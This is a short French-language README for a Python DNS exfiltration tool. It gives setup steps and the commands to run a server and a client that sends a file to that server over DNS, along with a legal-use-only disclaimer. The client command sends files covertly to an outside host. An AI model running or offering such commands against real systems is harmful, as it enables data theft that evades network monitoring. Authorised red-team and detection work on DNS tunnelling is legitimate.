# DNS-file-transfer
simple python script to transfer files from client to server over dns

# DNS Exfil — README (FR)

**Usage légal uniquement.** N'exécutez que sur des machines dont vous avez l'autorisation.

---

## Serveur

### 1) Se placer dans le dossier

```bash
cd server
```

### 2) Créer l'environnement virtuel

```bash
python3 -m venv myenv
```

### 3) Activer l'environnement

```bash
source myenv/bin/activate
```

### 4) Installer les dépendances

```bash
pip install -r requirements.txt
```

### 5) Lancer le serveur

```bash
python3 dns_exfil_server.py -d domaine.com -p motdepasse --port 53535
```

---

## Client

### 1) Se placer dans le dossier

```bash
cd client
```

### 2) Lancer le client

```bash
python dns_exfil_client.py <fichier> domaine.com motdepasse -s=<ip_serveur> -p=53535
```

---
